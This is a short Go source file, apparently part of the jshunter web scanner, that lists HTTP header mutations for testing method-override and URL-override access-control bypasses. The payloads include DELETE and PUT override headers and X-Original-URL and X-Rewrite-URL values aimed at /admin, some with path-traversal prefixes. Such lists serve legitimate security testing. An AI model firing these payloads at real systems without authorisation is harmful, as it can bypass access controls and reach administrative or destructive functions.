package headers

import "github.com/cc1a2b/jshunter/engine"

func GetOverrideMutations() []engine.Mutation {
	return []engine.Mutation{
		{Header: "X-HTTP-Method-Override", Value: "PUT", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-HTTP-Method-Override", Value: "DELETE", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-HTTP-Method-Override", Value: "PATCH", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-HTTP-Method-Override", Value: "TRACE", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-Method-Override", Value: "PUT", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-Method-Override", Value: "DELETE", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-Method-Override", Value: "PATCH", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-HTTP-Method", Value: "PUT", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-HTTP-Method", Value: "DELETE", Category: "Override", Impact: "Method Override Attack"},
		{Header: "_method", Value: "PUT", Category: "Override", Impact: "Method Override Attack"},
		{Header: "_method", Value: "DELETE", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-Original-Method", Value: "DELETE", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-Original-Method", Value: "PUT", Category: "Override", Impact: "Method Override Attack"},
		{Header: "X-Original-URL", Value: "/admin", Category: "Override", Impact: "URL Override Attack"},
		{Header: "X-Original-URL", Value: "/../admin", Category: "Override", Impact: "Path Traversal via Override"},
		{Header: "X-Original-URL", Value: "/api/admin", Category: "Override", Impact: "URL Override Attack"},
		{Header: "X-Rewrite-URL", Value: "/admin", Category: "Override", Impact: "URL Rewrite Attack"},
		{Header: "X-Rewrite-URL", Value: "/../../../admin", Category: "Override", Impact: "Path Traversal via Rewrite"},
	}
}
